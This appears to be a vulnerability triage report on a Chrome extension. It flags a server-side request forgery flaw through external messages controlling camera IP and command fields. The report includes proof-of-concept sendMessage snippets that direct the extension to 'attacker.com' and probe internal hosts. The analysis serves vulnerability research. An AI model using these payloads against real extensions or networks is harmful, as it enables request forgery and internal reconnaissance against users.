# CoCo Analysis: ankplacnfmmbllgdnpombagchcbodpji

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (4 unique flows - 2 duplicate XMLHttpRequest_url_sink detections)

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ankplacnfmmbllgdnpombagchcbodpji/opgen_generated_files/bg.js
Line 986: `xhr.open("POST", "http://"+message.camera_ip+"/ajaxcom", true);`

**Code:**

```javascript
// Background script (bg.js) - Lines 966-1001
chrome.runtime.onMessageExternal.addListener(function (message, sender, callback) {
    switch(message.type) {
        case 'camera_command':
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://"+message.camera_ip+"/ajaxcom", true); // ← attacker-controlled camera_ip
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                    var result = xhr.responseText;
                    callback(result); // ← sends response back to attacker
                    return false;
                } else {
                    callback(cmd)
                    return false;
                }
            };
            var cmd =  '{"SysCtrl":{"PtzCtrl":{"nChanel":0,"szPtzCmd":"'+message.cmmd+'","byValue":'+message.step+'}}}' // ← attacker-controlled cmmd and step
            xhr.send('szCmd=' +cmd); // ← attacker-controlled POST body
            return true;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://zerintia.com)
// or any extension can send external message
chrome.runtime.sendMessage(
  'ankplacnfmmbllgdnpombagchcbodpji',
  {
    type: 'camera_command',
    camera_ip: 'attacker.com', // ← attacker controls destination
    cmmd: 'malicious_command',
    step: 999
  },
  function(response) {
    console.log('Response from attacker.com:', response);
  }
);
```

**Impact:** SSRF (Server-Side Request Forgery) - Attacker can make the extension send arbitrary POST requests to any attacker-controlled destination and receive the response. The extension has permission to make HTTP requests and will send them with extension privileges. This allows bypassing CORS restrictions and making privileged cross-origin requests.

---

## Sink 2: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink (message.cmmd)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ankplacnfmmbllgdnpombagchcbodpji/opgen_generated_files/bg.js
Line 999: `var cmd = '{"SysCtrl":{"PtzCtrl":{"nChanel":0,"szPtzCmd":"'+message.cmmd+'","byValue":'+message.step+'}}}'`
Line 1000: `xhr.send('szCmd=' +cmd);`

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Impact:** This is part of the same vulnerability as Sink 1 - attacker controls both the destination URL (camera_ip) and the POST body content (cmmd and step parameters). This allows injection of arbitrary commands into the JSON payload sent to the attacker-controlled destination.

---

## Sink 3: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink (message.step)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ankplacnfmmbllgdnpombagchcbodpji/opgen_generated_files/bg.js
Line 999: `var cmd = '{"SysCtrl":{"PtzCtrl":{"nChanel":0,"szPtzCmd":"'+message.cmmd+'","byValue":'+message.step+'}}}'`
Line 1000: `xhr.send('szCmd=' +cmd);`

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Impact:** Same as Sink 2 - this is another attacker-controlled parameter (step) in the same vulnerable flow.

---

## Sink 4: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink (checkConnection)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ankplacnfmmbllgdnpombagchcbodpji/opgen_generated_files/bg.js
Line 1005: `xhr.open("GET", "http://"+message.camera_ip+"/ajaxcom", true);`

**Code:**

```javascript
// Background script (bg.js) - Lines 1003-1018
case 'checkConnection':
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://"+message.camera_ip+"/ajaxcom", true); // ← attacker-controlled camera_ip
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (this.status === 200) {
            callback(true); // ← sends result back to attacker
            return false
        } else {
            callback(false);
            return false
        }
    };
    xhr.send();
    return true
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain or any extension
chrome.runtime.sendMessage(
  'ankplacnfmmbllgdnpombagchcbodpji',
  {
    type: 'checkConnection',
    camera_ip: 'internal-server.local/admin' // ← probe internal network
  },
  function(response) {
    console.log('Connection successful:', response);
  }
);
```

**Impact:** SSRF - Attacker can probe internal network resources, check if services are running, and bypass firewall restrictions by using the extension as a proxy. The attacker receives a boolean response indicating whether the target responded with HTTP 200, allowing network reconnaissance.

---

## Sink 5: XMLHttpRequest_responseText_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ankplacnfmmbllgdnpombagchcbodpji/opgen_generated_files/bg.js
Line 332: `XMLHttpRequest.prototype.responseText = 'sensitive_responseText';`

**Classification:** FALSE POSITIVE

**Reason:** This detection references only CoCo framework code (Line 332 is before the 3rd "// original" marker at Line 963). The actual extension code does send xhr.responseText back via callback (Line 991-992), but this is part of the SSRF vulnerability already identified in Sink 1. The responseText itself originates from attacker-controlled destinations (since the URL is attacker-controlled), so there's no additional vulnerability beyond the SSRF. This is not a separate sensitive data exfiltration issue.
